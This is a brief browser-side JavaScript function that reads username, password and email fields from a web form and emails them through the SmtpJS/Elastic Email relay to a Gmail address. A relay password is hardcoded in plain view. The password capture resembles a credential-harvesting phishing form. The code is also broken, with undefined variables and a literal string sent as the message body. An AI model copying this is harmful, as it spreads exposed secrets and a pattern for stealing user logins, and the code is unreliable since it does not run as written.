function emailSend(){

	var username = document.getElementById('username').value;
	var password = document.getElementById('password').value;
	var email = document.getElementById('email').value;

	var messageBody = "Name " + userName +
	"<br/> Phone " + phone +
	"<br/> Email " + email;
	Email.send({
    Host : "smtp.elasticemail.com",
    Username : "nahirixrw@gmail.com",
    Password : "C25CA04AD46A8CD8A55FDBC56135ED964282",
    To : 'nahirixrw@gmail.com',
    From : "rayanelite5@gmail.com",
    Subject : "This is the subject",
    Body : "messageBody",
}).then(
  message => {
  	if(message=='OK'){
  		swal("Secussful", "You clicked the button!", "success");
  	}
  	else{
  		swal("Error", "You clicked the button!", "error");
  	}
  }
);
}